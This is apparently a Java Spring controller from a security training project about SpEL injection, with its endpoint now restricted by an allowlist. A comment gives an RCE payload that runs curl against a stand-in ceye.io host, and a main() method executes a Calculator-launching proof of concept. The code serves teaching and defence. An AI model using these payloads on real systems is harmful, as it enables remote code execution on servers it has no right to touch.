package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    // Strict allowlist: only simple property paths (letters, digits, underscores, dots).
    // Rejects T(...), new, #, method calls with parentheses, and all other dangerous patterns.
    private static final Pattern SAFE_SPEL_PATTERN = Pattern.compile("^[a-zA-Z][a-zA-Z0-9_.]*$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        if (expression == null || !SAFE_SPEL_PATTERN.matcher(expression).matches()) {
            return "Expression rejected: only simple property access (e.g. 'foo.bar') is allowed.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        return HtmlUtils.htmlEscape(parser.parseExpression(expression).getValue(String.class));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

